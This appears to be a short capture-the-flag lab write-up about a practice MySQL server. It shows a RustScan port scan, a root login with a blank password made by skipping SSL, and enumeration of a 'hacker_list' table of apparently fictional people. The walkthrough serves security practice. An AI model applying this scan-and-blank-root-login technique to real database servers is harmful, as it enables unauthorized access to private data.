## Description
```Description
MySQL is a relational database management system (RDBMS) that uses Structured Query Language (SQL) to manage and manipulate data. It's an open-source system widely used for web databases.  
  
Recommended for practicing the basics of MySQL and learning database fundamentals.
```

## IP-Address
```IP-Address
172.20.2.151
```

## RustScan
```bash
rustscan -a 172.20.2.151 -b 450 -t 2000 --ulimit 5000 -- -e tun0 -Pn

.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
PORT      STATE SERVICE REASON
3306/tcp  open  mysql   syn-ack ttl 63
33060/tcp open  mysqlx  syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 13.28 seconds
           Raw packets sent: 2 (88B) | Rcvd: 2 (88B)
```

## MySql Connect
```bash
mysql -h 172.20.2.151 -u root -p
Enter password: 
ERROR 2026 (HY000): TLS/SSL error: self-signed certificate in certificate chain
```

## Skip / Disabled SSL Certificate 
```bash
mysql -h 172.20.2.151 -u root -p --skip-ssl
Enter password: <blank>
Got the shell
```

## Explore MySql
```bash
MySQL [(none)]> SELECT USER(), CURRENT_USER();
+------------------+----------------+
| USER()           | CURRENT_USER() |
+------------------+----------------+
| root@10.8.33.208 | root@%         |
+------------------+----------------+
1 row in set (0.165 sec)
```

Then Databases
```bash
ySQL [(none)]> SHOW DATABASES;
+---------------------+
| Database            |
+---------------------+
| detective_inspector |
| information_schema  |
| mysql               |
| performance_schema  |
| sys                 |
+---------------------+
5 rows in set (0.198 sec)
```

Into the detective_inspector 
```bash
MySQL [detective_inspector]> show tables;
+-------------------------------+
| Tables_in_detective_inspector |
+-------------------------------+
| hacker_list                   |
+-------------------------------+
1 row in set (0.170 sec)
```

Into deep in the Table
```bash
ySQL [detective_inspector]> SELECT * FROM hacker_list LIMIT 20;
+------+-----------+-----------+------------+-----------+
| id   | firstName | lastName  | nickname   | type      |
+------+-----------+-----------+------------+-----------+
| 1001 | Jed       | Meadows   | sp1d3r     | gray-hat  |
| 1002 | Melissa   | Gamble    | c0c0net    | gray-hat  |
| 1003 | Frank     | Netsi     | v3nus      | gray-hat  |
| 1004 | Nancy     | Melton    | s1torml09  | black-hat |
| 1005 | Jack      | Dunn      | psyod3d    | black-hat |
| 1006 | Arron     | Eden      | r4nd0myfff | black-hat |
| 1007 | Lea       | Wells     | pumq7eggy7 | black-hat |
| 1008 | Hackviser | Hackviser | h4ckv1s3r  | white-hat |
| 1009 | Xavier    | Klein     | oricy4l33  | black-hat |
+------+-----------+-----------+------------+-----------+
9 rows in set (0.182 sec)
```

# END